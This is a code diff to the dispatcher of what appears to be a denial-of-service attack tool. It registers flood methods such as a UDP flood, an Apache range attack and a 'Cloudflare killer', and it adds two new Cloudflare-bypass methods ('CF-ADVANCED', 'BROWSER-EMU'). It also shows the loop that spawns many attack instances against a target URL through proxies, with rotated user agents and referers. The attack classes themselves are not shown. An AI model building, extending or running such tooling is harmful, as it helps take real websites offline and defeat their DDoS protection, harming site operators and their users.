@@ -43,6 +43,8 @@ export class MethodExecutor {
         map.set('APACHE', Layer7.ApacheRangeAttack);
         map.set('NULL', Layer7.NullAttack);
         map.set('CF-KILLER', Layer7.CloudflareKiller);
+        map.set('CF-ADVANCED', Layer7.CloudflareAdvancedBypass);
+        map.set('BROWSER-EMU', Layer7.BrowserEmulationAttack);
 
         // Layer 4 Methods
         map.set('UDP', Layer4.UDPFlood);
@@ -121,13 +123,17 @@ export class MethodExecutor {
             logger.info(`   Creating ${numInstances} attack instances (threads: ${threads})`);
             
             // Check which constructor signature to use
-            const isBypassMethod = ['CFB', 'CFBUAM', 'BYPASS', 'PRIVACYPASS', 'CAPTCHA', 'ULTIMATE'].includes(methodUpper);
+            const simpleBypassMethods = ['CFB', 'CFBUAM', 'BYPASS', 'PRIVACYPASS', 'CAPTCHA', 'ULTIMATE'].includes(methodUpper);
+            const advancedBypassMethods = ['CF-ADVANCED', 'BROWSER-EMU'].includes(methodUpper);
             
             for (let i = 0; i < numInstances; i++) {
                 let attack;
-                if (isBypassMethod) {
-                    // Bypass methods: (targetUrl, duration, rpc, proxies)
+                if (simpleBypassMethods) {
+                    // Simple bypass methods: (targetUrl, duration, rpc, proxies)
                     attack = new MethodClass(target, duration, rpc, proxies);
+                } else if (advancedBypassMethods) {
+                    // Advanced bypass methods: (targetUrl, duration, rpc, userAgents, referers, proxies)
+                    attack = new MethodClass(target, duration, rpc, userAgents, referers, proxies);
                 } else {
                     // Standard methods: (targetUrl, duration, rpc, userAgents, referers, proxies)
                     attack = new MethodClass(target, duration, rpc, userAgents, referers, proxies);
